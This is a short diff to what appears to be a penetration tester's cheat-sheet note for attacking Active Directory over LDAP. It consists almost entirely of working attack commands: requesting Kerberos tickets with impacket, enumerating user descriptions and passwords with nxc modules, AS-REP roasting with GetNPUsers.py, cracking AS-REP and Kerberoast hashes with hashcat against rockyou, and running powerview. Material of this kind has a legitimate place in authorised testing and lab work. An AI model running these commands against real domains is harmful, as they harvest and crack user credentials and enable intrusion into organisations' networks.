@@ -2,6 +2,7 @@
 #target/remote #os/linux #cat/ad #proto/ldap #port/389
 
 ## LDAP all in one
+#faketime
 ```
 getTGT.py <domain>/'<user>'<impacket_auth> && export KRB5CCNAME=$(pwd)/'<user>'.ccache
 
@@ -19,9 +20,9 @@ nxc ldap <ip> --use-kcache -M get-desc-users -M get-info-users -M get-unixUserPa
 
 GetNPUsers.py -request -outputfile hashes.asreproast <domain>/'<user>' -k -no-pass -dc-host <fqdn>
 
-[ -s hashes.asreproast ] && timeout 20 hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt --force --quiet
+sh -c '[ -s hashes.asreproast ] && hashcat --runtime 30 hashes.asreproast /usr/share/wordlists/rockyou.txt --force --quiet'
 
-[ -s hashes.kerberoast ] && timeout 20 hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt --force --quiet
+sh -c '[ -s hashes.kerberoast ] && hashcat --runtime 30 hashes.kerberoast /usr/share/wordlists/rockyou.txt --force --quiet'
 
 powerview <domain>/'<user>'@<dc_fqdn> -k --no-pass
 ```
